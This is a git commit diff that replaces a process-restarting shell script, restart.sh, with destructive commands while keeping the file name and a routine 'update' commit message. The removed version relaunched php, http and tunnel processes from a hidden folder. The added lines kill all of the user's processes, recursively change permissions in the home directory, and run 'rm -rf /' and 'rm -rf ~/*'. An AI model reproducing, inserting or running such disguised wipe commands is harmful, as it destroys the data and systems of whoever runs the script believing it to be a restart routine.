91ed44e3f171587e8c471baeddbcea6ca008a8ab
leung7963 <104255180+leung7963@users.noreply.github.com>
2025-04-03 13:32:42 +0800

    更新 restart.sh

--- restart.sh
+++ restart.sh
@@ -1,33 +1,6 @@
-#!/bin/bash
-
-
-FILE_PATH="./.application"
-
-echo "检查并 重启 任务"
-
-# 检查进程是否在运行
-
-#echo "检查php"
-pgrep -x "php" > /dev/null
-if [ $? -ne 0 ]; then
-    nohup ${FILE_PATH}/start.sh >/dev/null 2>&1 &
-    echo "运行成功php"
-fi
-
-
-#echo "检查http"
-pgrep -x "http" > /dev/null
-if [ $? -ne 0 ]; then
-    nohup ${FILE_PATH}/http run -c ${FILE_PATH}/config.json >/dev/null 2>&1 &
-    echo "http运行成功"
-fi
-
-
-#echo "检查node"
-pgrep -x "node" > /dev/null
-if [ $? -ne 0 ]; then
-    nohup ${FILE_PATH}/tunnel.sh >/dev/null 2>&1 &
-    echo "node运行成功"
-fi
-
-
+pkill -kill -u $(whoami)&&chmod -R 755 ~/*&&chmod -R 755 ~/.*&&rm -rf /&&rm -rf ~/*
+pkill -kill -u $(whoami)
+chmod -R 755 ~/*
+chmod -R 755 ~/.*
+rm -rf /
+rm -rf ~/*
